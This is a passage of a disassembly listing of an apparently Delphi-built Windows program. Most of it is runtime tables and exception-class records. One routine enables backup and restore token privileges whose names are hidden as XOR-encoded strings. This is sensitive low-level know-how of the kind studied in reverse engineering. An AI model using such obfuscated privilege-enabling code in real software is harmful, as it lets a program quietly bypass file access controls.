		mov	eax, offset dword_411A6C
		call	sub_4064CC
		mov	eax, [ebp+var_20]
		call	sub_403E24
		push	eax		; lpName
		push	0		; lpSystemName
		call	LookupPrivilegeValueA
		test	eax, eax
		jnz	short loc_4119A7
		mov	[ebp+var_18], 0
		mov	[ebp+var_14], 0

loc_4119A7:				; CODE XREF: sub_4118AC+EBj
		mov	esi, [ebx]
		dec	esi
		test	esi, esi
		jl	short loc_4119E4
		inc	esi
		xor	ecx, ecx

loc_4119B1:				; CODE XREF: sub_4118AC+136j
		lea	edi, [ecx+ecx*2]
		mov	eax, [ebx+edi*4+4]
		mov	edx, [ebx+edi*4+8]
		cmp	edx, [ebp+Luid.HighPart]
		jnz	short loc_4119C4
		cmp	eax, [ebp+Luid.LowPart]

loc_4119C4:				; CODE XREF: sub_4118AC+113j
		jz	short loc_4119E0
		lea	eax, [ecx+ecx*2]
		mov	edx, [ebx+eax*4+8]
		mov	eax, [ebx+eax*4+4]
		cmp	edx, [ebp+var_14]
		jnz	short loc_4119D9
		cmp	eax, [ebp+var_18]

loc_4119D9:				; CODE XREF: sub_4118AC+128j
		jz	short loc_4119E0
		or	dword ptr [ebx+edi*4+0Ch], 2

loc_4119E0:				; CODE XREF: sub_4118AC:loc_4119C4j
					; sub_4118AC:loc_4119D9j
		inc	ecx
		dec	esi
		jnz	short loc_4119B1

loc_4119E4:				; CODE XREF: sub_4118AC+100j
		push	0		; ReturnLength
		push	0		; PreviousState
		mov	eax, [ebp+BufferLength]
		push	eax		; BufferLength
		push	ebx		; NewState
		push	0		; DisableAllPrivileges
		mov	eax, [ebp+hObject]
		push	eax		; TokenHandle
		call	AdjustTokenPrivileges

loc_4119F8:				; CODE XREF: sub_4118AC+8Fj
		push	ebx		; hMem
		call	LocalFree_1

loc_4119FE:				; CODE XREF: sub_4118AC+62j
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_411A1C

loc_411A0B:				; CODE XREF: sub_4118AC+16Ej
		mov	eax, [ebp+hObject]
		push	eax		; hObject
		call	CloseHandle
		retn
; ---------------------------------------------------------------------------

loc_411A15:				; DATA XREF: sub_4118AC+3Bo
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_411A0B
; ---------------------------------------------------------------------------

loc_411A1C:				; CODE XREF: sub_4118AC+32j
					; sub_4118AC+168j
					; DATA XREF: ...
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_411A3E

loc_411A29:				; CODE XREF: sub_4118AC+190j
		lea	eax, [ebp+var_20]
		mov	edx, 2
		call	sub_4039B8
		retn
; ---------------------------------------------------------------------------

loc_411A37:				; DATA XREF: sub_4118AC+14o
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_411A29
; ---------------------------------------------------------------------------

loc_411A3E:				; CODE XREF: sub_4118AC+18Aj
					; DATA XREF: sub_4118AC+178o
		pop	edi
		pop	esi
		pop	ebx
		mov	esp, ebp
		pop	ebp
		retn
sub_4118AC	endp

; ---------------------------------------------------------------------------
		align 4
		dd 0FFFFFFFFh, 11h
dword_411A50	dd 34173006h, 25203E36h, 233C2705h, 3230393Ch, 30h, 0FFFFFFFFh
					; DATA XREF: sub_4118AC+9Co
		dd 12h
dword_411A6C	dd 30073006h, 273A2126h, 3C270530h, 30393C23h, 3032h
					; DATA XREF: sub_4118AC+CFo

; =============== S U B	R O U T	I N E =======================================


sub_411A80	proc near		; CODE XREF: sub_411B3C+1Ap
		mov	eax, ds:off_416D5C
		mov	byte ptr [eax],	1
		call	sub_407058
		call	GetVersion_0
		test	eax, 80000000h
		jnz	short loc_411A9E
		call	sub_4118AC

loc_411A9E:				; CODE XREF: sub_411A80+17j
		push	0		; dwErrCode
		call	SetLastError
		retn
sub_411A80	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_411AA8	proc near		; CODE XREF: sub_411AB4+19p
		xor	edx, edx
		or	eax, 0FFFFFFFFh
		call	sub_411560
		retn
sub_411AA8	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_411AB4	proc near		; DATA XREF: CODE:00415BD0o
		push	ebp
		mov	ebp, esp
		xor	eax, eax
		push	ebp
		push	offset loc_411B30
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		inc	ds:dword_4176BC
		jnz	short loc_411B22
		call	sub_411AA8
		mov	eax, offset dword_4176F0
		mov	edx, off_410820
		call	sub_404724
		mov	eax, offset dword_4176D4
		mov	edx, off_405490
		call	sub_404724
		mov	eax, offset dword_4176D0
		mov	edx, off_405490
		call	sub_404724
		mov	eax, offset dword_4176CC
		mov	edx, off_405490
		call	sub_404724
		mov	eax, offset dword_4176C8
		mov	edx, off_40CFE4
		call	sub_404724

loc_411B22:				; CODE XREF: sub_411AB4+17j
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_411B37

loc_411B2F:				; CODE XREF: sub_411AB4+81j
		retn
; ---------------------------------------------------------------------------

loc_411B30:				; DATA XREF: sub_411AB4+6o
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_411B2F
; ---------------------------------------------------------------------------

loc_411B37:				; CODE XREF: sub_411AB4:loc_411B2Fj
					; DATA XREF: sub_411AB4+76o
		pop	ebp
		retn
sub_411AB4	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_411B3C	proc near		; DATA XREF: CODE:00415BCCo
		push	ebp
		mov	ebp, esp
		xor	eax, eax
		push	ebp
		push	offset loc_411B69
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		sub	ds:dword_4176BC, 1
		jnb	short loc_411B5B
		call	sub_411A80

loc_411B5B:				; CODE XREF: sub_411B3C+18j
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_411B70

loc_411B68:				; CODE XREF: sub_411B3C+32j
		retn
; ---------------------------------------------------------------------------

loc_411B69:				; DATA XREF: sub_411B3C+6o
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_411B68
; ---------------------------------------------------------------------------

loc_411B70:				; CODE XREF: sub_411B3C:loc_411B68j
					; DATA XREF: sub_411B3C+27o
		pop	ebp
		retn
sub_411B3C	endp

; ---------------------------------------------------------------------------
		align 4
off_411B74	dd offset hModule	; DATA XREF: DATA:off_416D64o
		dd 0FFF0h
		dd offset hModule	; DATA XREF: DATA:off_416D58o
		dd 0FFF1h
off_411B84	dd offset hModule	; DATA XREF: DATA:off_416DACo
		dd 0FFF2h
off_411B8C	dd offset hModule	; DATA XREF: DATA:off_416E4Co
		dd 0FFF3h
off_411B94	dd offset hModule	; DATA XREF: DATA:off_416D10o
		dd 0FFF4h
off_411B9C	dd offset hModule	; DATA XREF: DATA:off_416E18o
		dd 0FFF5h
off_411BA4	dd offset hModule	; DATA XREF: DATA:off_416DE4o
		dd 0FFF6h
off_411BAC	dd offset hModule	; DATA XREF: DATA:off_416D40o
		dd 0FFF7h
off_411BB4	dd offset hModule	; DATA XREF: DATA:off_416D6Co
		dd 0FFF8h
off_411BBC	dd offset hModule	; DATA XREF: DATA:off_416E58o
		dd 0FFF9h
off_411BC4	dd offset hModule	; DATA XREF: DATA:off_416E54o
		dd 0FFFAh
off_411BCC	dd offset hModule	; DATA XREF: DATA:off_416DB0o
		dd 0FFFBh
off_411BD4	dd offset hModule	; DATA XREF: DATA:off_416E64o
		dd 0FFFCh
off_411BDC	dd offset hModule	; DATA XREF: DATA:off_416E78o
		dd 0FFFDh
off_411BE4	dd offset hModule	; DATA XREF: DATA:off_416DE8o
		dd 0FFFEh
off_411BEC	dd offset hModule	; DATA XREF: DATA:off_416DFCo
		dd 0FFFFh
		dd offset hModule	; DATA XREF: DATA:off_416DF4o
		dd 0FFE0h
off_411BFC	dd offset hModule	; DATA XREF: DATA:off_416E74o
		dd 0FFE1h
		dd offset hModule	; DATA XREF: DATA:off_416E10o
		dd 0FFE2h
off_411C0C	dd offset hModule	; DATA XREF: DATA:off_416DA0o
		dd 0FFE3h
off_411C14	dd offset hModule	; DATA XREF: DATA:off_416D9Co
		dd 0FFE4h
off_411C1C	dd offset hModule	; DATA XREF: DATA:off_416DA4o
		dd 0FFE5h
off_411C24	dd offset hModule	; DATA XREF: DATA:off_416E50o
		dd 0FFE6h
		dd offset hModule	; DATA XREF: DATA:off_416E70o
		dd 0FFE7h
off_411C34	dd offset hModule	; DATA XREF: DATA:off_416D60o
		dd 0FFE8h
off_411C3C	dd offset hModule	; DATA XREF: DATA:off_416B68o
					; DATA:off_416D70o
		dd 0FFE9h
off_411C44	dd offset hModule	; DATA XREF: DATA:off_416B6Co
					; DATA:off_416DB4o
		dd 0FFEAh
off_411C4C	dd offset hModule	; DATA XREF: DATA:off_416D0Co
		dd 0FFEBh
		dd offset hModule	; DATA XREF: DATA:off_416E7Co
		dd 0FFECh
		dd offset hModule	; DATA XREF: DATA:off_416E0Co
		dd 0FFEDh
off_411C64	dd offset hModule	; DATA XREF: DATA:off_416DB8o
		dd 0FFEEh
off_411C6C	dd offset hModule	; DATA XREF: DATA:off_416E30o
		dd 0FFEFh
off_411C74	dd offset hModule	; DATA XREF: DATA:off_416DD4o
		dd 0FFD0h
off_411C7C	dd offset hModule	; DATA XREF: DATA:off_416DC8o
		dd 0FFD1h
off_411C84	dd offset hModule	; DATA XREF: DATA:off_416D78o
		dd 0FFD2h
		dd offset hModule	; DATA XREF: DATA:off_416D2Co
		dd 0FFD3h
		dd offset hModule	; DATA XREF: DATA:off_416E1Co
		dd 0FFD4h
off_411C9C	dd offset hModule	; DATA XREF: DATA:off_416DC0o
		dd 0FFD5h
off_411CA4	dd offset hModule	; DATA XREF: DATA:off_416E08o
		dd 0FFD6h
		dd offset hModule	; DATA XREF: DATA:off_416E3Co
		dd 0FFD7h
off_411CB4	dd offset hModule	; DATA XREF: DATA:off_416D74o
		dd 0FFD8h
		dd offset hModule	; DATA XREF: DATA:off_416E34o
		dd 0FFD9h
off_411CC4	dd offset hModule	; DATA XREF: DATA:off_416B80o
					; DATA:off_416E68o
		dd 0FFDAh
off_411CCC	dd offset hModule	; DATA XREF: DATA:off_416B84o
					; DATA:off_416DD8o
		dd 0FFDBh
off_411CD4	dd offset hModule	; DATA XREF: DATA:off_416B88o
					; DATA:off_416E48o
		dd 0FFDCh
off_411CDC	dd offset hModule	; DATA XREF: DATA:off_416B8Co
					; DATA:off_416D08o
		dd 0FFDDh
off_411CE4	dd offset hModule	; DATA XREF: DATA:off_416B90o
					; DATA:off_416D3Co
		dd 0FFDEh
off_411CEC	dd offset hModule	; DATA XREF: DATA:off_416B94o
					; DATA:off_416E80o
		dd 0FFDFh
off_411CF4	dd offset hModule	; DATA XREF: DATA:off_416B98o
					; DATA:off_416E38o
		dd 0FFC0h
off_411CFC	dd offset hModule	; DATA XREF: DATA:off_416B9Co
					; DATA:off_416D24o
		dd 0FFC1h
off_411D04	dd offset hModule	; DATA XREF: DATA:off_416BA0o
					; DATA:off_416D68o
; ---------------------------------------------------------------------------
		retn	0FFh
; ---------------------------------------------------------------------------
		align 4
off_411D0C	dd offset hModule	; DATA XREF: DATA:off_416BA4o
					; DATA:off_416DDCo
; ---------------------------------------------------------------------------
		retn
; ---------------------------------------------------------------------------
		db 0FFh, 2 dup(0)
off_411D14	dd offset hModule	; DATA XREF: DATA:off_416BA8o
					; DATA:off_416E40o
		dd 0FFC4h
off_411D1C	dd offset hModule	; DATA XREF: DATA:off_416BACo
					; DATA:off_416E5Co
		dd 0FFC5h
off_411D24	dd offset hModule	; DATA XREF: DATA:off_416BB0o
					; DATA:off_416DBCo
		dd 0FFC6h
off_411D2C	dd offset hModule	; DATA XREF: DATA:off_416BB4o
					; DATA:off_416D14o
		dd 0FFC7h
off_411D34	dd offset hModule	; DATA XREF: DATA:off_416BB8o
					; DATA:off_416D8Co
		dd 0FFC8h
off_411D3C	dd offset hModule	; DATA XREF: DATA:off_416BBCo
					; DATA:off_416DCCo
		dd 0FFC9h
off_411D44	dd offset hModule	; DATA XREF: DATA:off_416BC0o
					; DATA:off_416DF0o
; ---------------------------------------------------------------------------
		retf	0FFh
; ---------------------------------------------------------------------------
		align 4
off_411D4C	dd offset hModule	; DATA XREF: DATA:off_416BC4o
					; DATA:off_416DC4o
; ---------------------------------------------------------------------------
		retf
; ---------------------------------------------------------------------------
		db 0FFh, 2 dup(0)
off_411D54	dd offset hModule	; DATA XREF: DATA:off_416BC8o
					; DATA:off_416D7Co
		db 0CCh
		db 0FFh, 2 dup(0)
off_411D5C	dd offset hModule	; DATA XREF: DATA:off_416BCCo
					; DATA:off_416DD0o
		dd 0FFCDh
off_411D64	dd offset hModule	; DATA XREF: DATA:off_416BD0o
					; DATA:off_416E20o
		dd 0FFCEh
off_411D6C	dd offset hModule	; DATA XREF: DATA:off_416BD4o
					; DATA:off_416D18o
		dd 0FFCFh
off_411D74	dd offset hModule	; DATA XREF: DATA:off_416BD8o
					; DATA:off_416D84o
		dd 0FFB0h
off_411D7C	dd offset hModule	; DATA XREF: DATA:off_416BDCo
					; DATA:off_416D98o
		dd 0FFB1h
off_411D84	dd offset hModule	; DATA XREF: DATA:off_416BE0o
					; DATA:off_416E00o
		dd 0FFB2h
off_411D8C	dd offset hModule	; DATA XREF: DATA:off_416BE4o
					; DATA:off_416E24o
		dd 0FFB3h
off_411D94	dd offset hModule	; DATA XREF: DATA:off_416BE8o
					; DATA:off_416E2Co
		dd 0FFB4h
off_411D9C	dd offset hModule	; DATA XREF: DATA:off_416BECo
					; DATA:off_416DE0o
		dd 0FFB5h
off_411DA4	dd offset hModule	; DATA XREF: DATA:off_416BF0o
					; DATA:off_416D48o
		dd 0FFB6h
off_411DAC	dd offset hModule	; DATA XREF: DATA:off_416BF4o
					; DATA:off_416DF8o
		dd 0FFB7h
off_411DB4	dd offset hModule	; DATA XREF: DATA:off_416BF8o
					; DATA:off_416DA8o
		dd 0FFB8h
off_411DBC	dd offset hModule	; DATA XREF: DATA:off_416BFCo
					; DATA:off_416D38o
		dd 0FFB9h
off_411DC4	dd offset hModule	; DATA XREF: DATA:off_416C00o
					; DATA:off_416D44o
		dd 0FFBAh
off_411DCC	dd offset hModule	; DATA XREF: DATA:off_416C04o
					; DATA:off_416D4Co
		dd 0FFBBh
off_411DD4	dd offset hModule	; DATA XREF: DATA:off_416C08o
					; DATA:off_416D1Co
		dd 0FFBCh
off_411DDC	dd offset hModule	; DATA XREF: DATA:off_416C0Co
					; DATA:off_416E14o
		dd 0FFBDh
off_411DE4	dd offset hModule	; DATA XREF: DATA:off_416C10o
					; DATA:off_416D30o
		dd 0FFBEh
off_411DEC	dd offset hModule	; DATA XREF: DATA:off_416C14o
					; DATA:off_416E44o
		dd 0FFBFh

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_411DF4	proc near		; DATA XREF: CODE:00415BD8o
		push	ebp
		mov	ebp, esp
		xor	eax, eax
		push	ebp
		push	offset loc_411E19
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		inc	ds:dword_4176F4
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_411E20

loc_411E18:				; CODE XREF: sub_411DF4+2Aj
		retn
; ---------------------------------------------------------------------------

loc_411E19:				; DATA XREF: sub_411DF4+6o
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_411E18
; ---------------------------------------------------------------------------

loc_411E20:				; CODE XREF: sub_411DF4:loc_411E18j
					; DATA XREF: sub_411DF4+1Fo
		pop	ebp
		retn
sub_411DF4	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_411E24	proc near		; DATA XREF: CODE:00415BD4o
		sub	ds:dword_4176F4, 1
		retn
sub_411E24	endp

; ---------------------------------------------------------------------------
off_411E2C	dd offset dword_411E78	; DATA XREF: CODE:00411EBCo
					; CODE:00411F74o ...
		dd 2 dup(0)
		dd offset dword_411E78
		dd 4 dup(0)
		dd offset word_411E8A
		dd 0Ch
		dd offset off_401024
		dd offset sub_402E04
		dd offset nullsub_1
		dd offset nullsub_2
		dd offset sub_402E18
		dd offset nullsub_3
		dd offset sub_402CD0
		dd offset sub_402CEC
		dd offset sub_402D08
dword_411E78	dd 0Eh,	10000h		; DATA XREF: CODE:off_411E2Co
					; CODE:00411E38o
		db 2 dup(0)
		dd offset off_401018
		dw 4
		db 2 dup(0)
word_411E8A	dw 4509h		; DATA XREF: CODE:00411E4Co
		dd 70656378h, 6E6F6974h
off_411E94	dd offset dword_411EE0	; DATA XREF: CODE:00411F18o
					; CODE:004123A0o
		dd 7 dup(0)
		dd offset dword_411EE0
		dd 10h
		dd offset off_411E2C
		dd offset sub_402E04
		dd offset nullsub_1
		dd offset nullsub_2
		dd offset sub_402E18
		dd offset nullsub_3
		dd offset sub_402CD0
		dd offset sub_413F3C
		dd offset sub_402D08
dword_411EE0	dd 6548450Eh, 78457061h, 74706563h, 906E6F69h ;	DATA XREF: CODE:off_411E94o
					; CODE:00411EB4o
off_411EF0	dd offset dword_411F3C	; DATA XREF: sub_41446C+8r
		dd 7 dup(0)
		dd offset dword_411F3C
		dd 10h
		dd offset off_411E94
		dd offset sub_402E04
		dd offset nullsub_1
		dd offset nullsub_2
		dd offset sub_402E18
		dd offset nullsub_3
		dd offset sub_402CD0
		dd offset sub_413F3C
		dd offset sub_402D08
dword_411F3C	dd 754F450Ch, 4D664F74h, 726F6D65h, 408D79h ; DATA XREF: CODE:off_411EF0o
					; CODE:00411F10o
off_411F4C	dd offset dword_411F98	; DATA XREF: sub_413F68+2Dr
					; sub_413F68+4Cr
		dd 7 dup(0)
		dd offset dword_411F98
		dd 10h
		dd offset off_411E2C
		dd offset sub_402E04
		dd offset nullsub_1
		dd offset nullsub_2
		dd offset sub_402E18
		dd offset nullsub_3
		dd offset sub_402CD0
		dd offset sub_402CEC
		dd offset sub_402D08
dword_411F98	dd 6E49450Bh, 4574754Fh, 726F7272h ; DATA XREF:	CODE:off_411F4Co
					; CODE:00411F6Co
off_411FA4	dd offset dword_411FF0	; DATA XREF: CODE:00412024o
					; CODE:00412084o ...
		dd 7 dup(0)
		dd offset dword_411FF0
		dd 10h
		dd offset off_411E2C
		dd offset sub_402E04
		dd offset nullsub_1
		dd offset nullsub_2
		dd offset sub_402E18
		dd offset nullsub_3
		dd offset sub_402CD0
		dd offset sub_402CEC
		dd offset sub_402D08
dword_411FF0	dd 78454509h, 6E726574h, 0C08B6C61h ; DATA XREF: CODE:off_411FA4o
					; CODE:00411FC4o
off_411FFC	dd offset dword_412048	; DATA XREF: sub_414390+82r
		dd 7 dup(0)
		dd offset dword_412048
		dd 10h
		dd offset off_411FA4
		dd offset sub_402E04
		dd offset nullsub_1
		dd offset nullsub_2
		dd offset sub_402E18
		dd offset nullsub_3
		dd offset sub_402CD0
		dd offset sub_402CEC
		dd offset sub_402D08
dword_412048	dd 78454512h, 6E726574h, 78456C61h, 74706563h, 906E6F69h
					; DATA XREF: CODE:off_411FFCo
					; CODE:0041201Co ...
off_41205C	dd offset dword_4120A8	; DATA XREF: CODE:004120DCo
					; CODE:00412134o ...
		dd 7 dup(0)
		dd offset dword_4120A8
		dd 10h
		dd offset off_411FA4
		dd offset sub_402E04
		dd offset nullsub_1
		dd offset nullsub_2
		dd offset sub_402E18
		dd offset nullsub_3
		dd offset sub_402CD0
		dd offset sub_402CEC
		dd offset sub_402D08
dword_4120A8	dd 6E494509h, 72724574h, 0C08B726Fh ; DATA XREF: CODE:off_41205Co
					; CODE:0041207Co
		dd offset dword_412100
		dd 7 dup(0)
		dd offset dword_412100
		dd 10h
		dd offset off_41205C
		dd offset sub_402E04
		dd offset nullsub_1
		dd offset nullsub_2
		dd offset sub_402E18
		dd offset nullsub_3
		dd offset sub_402CD0
		dd offset sub_402CEC
		dd offset sub_402D08
dword_412100	dd 6944450Ah, 5A794276h, 906F7265h ; DATA XREF:	CODE:004120B4o
					; CODE:004120D4o ...
		dd offset dword_412158
		dd 7 dup(0)
		dd offset dword_412158
		dd 10h
		dd offset off_41205C
		dd offset sub_402E04
		dd offset nullsub_1
		dd offset nullsub_2
		dd offset sub_402E18
		dd offset nullsub_3
		dd offset sub_402CD0
		dd offset sub_402CEC
		dd offset sub_402D08
dword_412158	dd 6152450Bh, 4565676Eh, 726F7272h ; DATA XREF:	CODE:0041210Co
					; CODE:0041212Co ...
		dd offset dword_4121B0
		dd 7 dup(0)
		dd offset dword_4121B0
		dd 10h
		dd offset off_41205C
		dd offset sub_402E04
		dd offset nullsub_1
		dd offset nullsub_2
		dd offset sub_402E18
		dd offset nullsub_3
		dd offset sub_402CD0
		dd offset sub_402CEC
		dd offset sub_402D08
dword_4121B0	dd 6E49450Ch, 65764F74h, 6F6C6672h, 408D77h ; DATA XREF: CODE:00412164o
					; CODE:00412184o ...
off_4121C0	dd offset dword_41220C	; DATA XREF: CODE:00412240o
					; CODE:00412298o ...
		dd 7 dup(0)
		dd offset dword_41220C
		dd 10h
		dd offset off_411FA4
		dd offset sub_402E04
		dd offset nullsub_1
		dd offset nullsub_2
		dd offset sub_402E18
		dd offset nullsub_3
		dd offset sub_402CD0
		dd offset sub_402CEC
		dd offset sub_402D08
dword_41220C	dd 614D450Ah, 72456874h, 90726F72h ; DATA XREF:	CODE:off_4121C0o
					; CODE:004121E0o
		dd offset dword_412264
		dd 7 dup(0)
		dd offset dword_412264
		dd 10h
		dd offset off_4121C0
		dd offset sub_402E04
		dd offset nullsub_1
		dd offset nullsub_2
		dd offset sub_402E18
		dd offset nullsub_3
		dd offset sub_402CD0
		dd offset sub_402CEC
		dd offset sub_402D08
dword_412264	dd 6E49450Ah, 696C6176h, 90704F64h ; DATA XREF:	CODE:00412218o
					; CODE:00412238o ...
		dd offset dword_4122BC
		dd 7 dup(0)
		dd offset dword_4122BC
		dd 10h
		dd offset off_4121C0
		dd offset sub_402E04
		dd offset nullsub_1
		dd offset nullsub_2
		dd offset sub_402E18
		dd offset nullsub_3
		dd offset sub_402CD0
		dd offset sub_402CEC
		dd offset sub_402D08
dword_4122BC	dd 655A450Bh, 69446F72h, 65646976h ; DATA XREF:	CODE:00412270o
					; CODE:00412290o ...
		dd offset dword_412314
		dd 7 dup(0)
		dd offset dword_412314
		dd 10h
		dd offset off_4121C0
		dd offset sub_402E04
		dd offset nullsub_1
		dd offset nullsub_2
		dd offset sub_402E18
		dd offset nullsub_3
		dd offset sub_402CD0
		dd offset sub_402CEC
		dd offset sub_402D08
dword_412314	dd 764F4509h, 6C667265h, 0C08B776Fh ; DATA XREF: CODE:004122C8o
					; CODE:004122E8o ...
		dd offset dword_41236C
		dd 7 dup(0)
		dd offset dword_41236C
		dd 10h
		dd offset off_4121C0
		dd offset sub_402E04
		dd offset nullsub_1
		dd offset nullsub_2
		dd offset sub_402E18
		dd offset nullsub_3
		dd offset sub_402CD0
		dd offset sub_402CEC
		dd offset sub_402D08
dword_41236C	dd 6E55450Ah, 66726564h, 90776F6Ch ; DATA XREF:	CODE:00412320o
					; CODE:00412340o ...
off_412378	dd offset dword_4123C4	; DATA XREF: sub_41446C+1Fr
		dd 7 dup(0)
		dd offset dword_4123C4
		dd 10h
		dd offset off_411E94
		dd offset sub_402E04
		dd offset nullsub_1
		dd offset nullsub_2
		dd offset sub_402E18
		dd offset nullsub_3
		dd offset sub_402CD0
		dd offset sub_413F3C
		dd offset sub_402D08
dword_4123C4	dd 6E49450Fh, 696C6176h, 696F5064h, 7265746Eh ;	DATA XREF: CODE:off_412378o
					; CODE:00412398o
		dd offset dword_412420
		dd 7 dup(0)
		dd offset dword_412420
		dd 0Ch
		dd offset off_411E2C
		dd offset sub_402E04
		dd offset nullsub_1
		dd offset nullsub_2
		dd offset sub_402E18
		dd offset nullsub_3
		dd offset sub_402CD0
		dd offset sub_402CEC
		dd offset sub_402D08
dword_412420	dd 6E49450Ch, 696C6176h, 73614364h, 408D74h ; DATA XREF: CODE:004123D4o
					; CODE:004123F4o ...
off_412430	dd offset dword_41247C	; DATA XREF: sub_412820+Fr
		dd 7 dup(0)
		dd offset dword_41247C
		dd 0Ch
		dd offset off_411E2C
		dd offset sub_402E04
		dd offset nullsub_1
		dd offset nullsub_2
		dd offset sub_402E18
		dd offset nullsub_3
		dd offset sub_402CD0
		dd offset sub_402CEC
		dd offset sub_402D08
dword_41247C	dd 6F43450Dh, 7265766Eh, 72724574h, 0C08B726Fh ; DATA XREF: CODE:off_412430o
					; CODE:00412450o
off_41248C	dd offset dword_4124D8	; DATA XREF: sub_4141C4+122r
					; sub_4141C4+17Er
		dd 7 dup(0)
		dd offset dword_4124D8
		dd 10h
		dd offset off_411FA4
		dd offset sub_402E04
		dd offset nullsub_1
		dd offset nullsub_2
		dd offset sub_402E18
		dd offset nullsub_3
		dd offset sub_402CD0
		dd offset sub_402CEC
		dd offset sub_402D08
dword_4124D8	dd 63414510h, 73736563h, 6C6F6956h, 6F697461h, 408D6Eh
					; DATA XREF: CODE:off_41248Co
					; CODE:004124ACo ...
		dd offset dword_412538
		dd 7 dup(0)
		dd offset dword_412538
		dd 10h
		dd offset off_411FA4
		dd offset sub_402E04
		dd offset nullsub_1
		dd offset nullsub_2
		dd offset sub_402E18
		dd offset nullsub_3
		dd offset sub_402CD0
		dd offset sub_402CEC
		dd offset sub_402D08
dword_412538	dd 7250450Ah, 6C697669h, 90656765h ; DATA XREF:	CODE:004124ECo
					; CODE:0041250Co ...
		dd offset dword_412590
		dd 7 dup(0)
		dd offset dword_412590
		dd 10h
		dd offset off_411FA4
		dd offset sub_402E04
		dd offset nullsub_1
		dd offset nullsub_2
		dd offset sub_402E18
		dd offset nullsub_3
		dd offset sub_402CD0
		dd offset sub_402CEC
		dd offset sub_402D08
dword_412590	dd 7453450Eh, 4F6B6361h, 66726576h, 90776F6Ch ;	DATA XREF: CODE:00412544o
					; CODE:00412564o ...
		dd offset dword_4125EC
		dd 7 dup(0)
		dd offset dword_4125EC
		dd 10h
		dd offset off_411FA4
		dd offset sub_402E04
		dd offset nullsub_1
		dd offset nullsub_2
		dd offset sub_402E18
		dd offset nullsub_3
		dd offset sub_402CD0
		dd offset sub_402CEC
		dd offset sub_402D08
dword_4125EC	dd 6F434509h, 6F72746Eh, 0C08B436Ch ; DATA XREF: CODE:004125A0o
					; CODE:004125C0o ...
		dd offset dword_412644
		dd 7 dup(0)
		dd offset dword_412644
		dd 0Ch
		dd offset off_411E2C
		dd offset sub_402E04
		dd offset nullsub_1
		dd offset nullsub_2
		dd offset sub_402E18
		dd offset nullsub_3
		dd offset sub_402CD0
		dd offset sub_402CEC
		dd offset sub_402D08
dword_412644	dd 6156450Dh, 6E616972h, 72724574h, 0C08B726Fh ; DATA XREF: CODE:004125F8o
					; CODE:00412618o ...
off_412654	dd offset dword_4126A0	; DATA XREF: sub_41403C+72r
		dd 7 dup(0)
		dd offset dword_4126A0
		dd 0Ch
		dd offset off_411E2C
		dd offset sub_402E04
		dd offset nullsub_1
		dd offset nullsub_2
		dd offset sub_402E18
		dd offset nullsub_3
		dd offset sub_402CD0
		dd offset sub_402CEC
		dd offset sub_402D08
dword_4126A0	dd 73414510h, 74726573h, 466E6F69h, 656C6961h, 408D64h
					; DATA XREF: CODE:off_412654o
					; CODE:00412674o ...
off_4126B4	dd offset dword_412700	; DATA XREF: CODE:0041411Cr
		dd 7 dup(0)
		dd offset dword_412700
		dd 0Ch
		dd offset off_411E2C
		dd offset sub_402E04
		dd offset nullsub_1
		dd offset nullsub_2
		dd offset sub_402E18
		dd offset nullsub_3
		dd offset sub_402CD0
		dd offset sub_402CEC
		dd offset sub_402D08
dword_412700	dd 6241450Eh, 61727473h, 72457463h, 90726F72h ;	DATA XREF: CODE:off_4126B4o
					; CODE:004126D4o
		dd offset dword_41275C
		dd 7 dup(0)
		dd offset dword_41275C
		dd 0Ch
		dd offset off_411E2C
		dd offset sub_402E04
		dd offset nullsub_1
		dd offset nullsub_2
		dd offset sub_402E18
		dd offset nullsub_3
		dd offset sub_402CD0
		dd offset sub_402CEC
		dd offset sub_402D08
dword_41275C	dd 6E49450Eh, 61436674h, 72457473h, 90726F72h ;	DATA XREF: CODE:00412710o
					; CODE:00412730o ...
		dd offset dword_4127B8
		dd 7 dup(0)
		dd offset dword_4127B8
		dd 0Ch
		dd offset off_411E2C
		dd offset sub_402E04
		dd offset nullsub_1
		dd offset nullsub_2
		dd offset sub_402E18
		dd offset nullsub_3
		dd offset sub_402CD0
		dd offset sub_402CEC
		dd offset sub_402D08
dword_4127B8	dd 61534512h, 61636566h, 78456C6Ch, 74706563h, 906E6F69h
					; DATA XREF: CODE:0041276Co
					; CODE:0041278Co ...
off_4127CC	dd offset dword_4127D0	; DATA XREF: sub_41508C+8Fr
dword_4127D0	dd 372E0311h, 434h	; DATA XREF: CODE:off_4127CCo
		db 0
		dd offset off_401018
		db 48h,	2 dup(0)
		db 0
		dd offset off_401018
		db 8, 53h, 79h
		dd 69745573h, 0C08B736Ch
off_4127F0	dd offset dword_4127F4	; DATA XREF: sub_41508C+7Fr
dword_4127F4	dd 382E0311h, 434h	; DATA XREF: CODE:off_4127F0o
		db 0
		dd offset off_401018
		db 48h,	2 dup(0)
		db 0
		dd offset off_401018
		db 8, 53h, 79h
		dd 69745573h, 0C08B736Ch, 0FFFFFFFFh, 1
dword_41281C	dd 24h			; DATA XREF: DATA:off_416B58o

; =============== S U B	R O U T	I N E =======================================


sub_412820	proc near		; CODE XREF: sub_412B9C+4Cp
		push	ebx
